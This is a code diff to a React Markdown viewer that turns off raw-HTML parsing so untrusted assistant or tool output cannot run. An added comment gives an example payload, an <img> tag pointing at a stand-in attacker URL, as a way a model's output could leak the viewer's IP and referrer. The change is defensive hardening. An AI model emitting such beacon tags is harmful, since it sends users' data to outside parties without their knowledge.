@@ -63,6 +63,12 @@ export default function MarkdownView({ children }: { children: string }) {
       <Markdown
         options={{
           forceBlock: true,
+          // Assistant/tool output is 100% untrusted. We render Markdown, not
+          // HTML — so disable raw-HTML parsing entirely. This removes the
+          // <img>-beacon / CSS-injection surface (a model can otherwise emit
+          // `<img src="http://attacker/collect?…">` to exfiltrate the viewer's
+          // IP/referrer) on top of the library's javascript:/vbscript: filter.
+          disableParsingRawHTML: true,
           overrides: {
             pre: { component: PreBlock },
             code: { component: InlineCode },
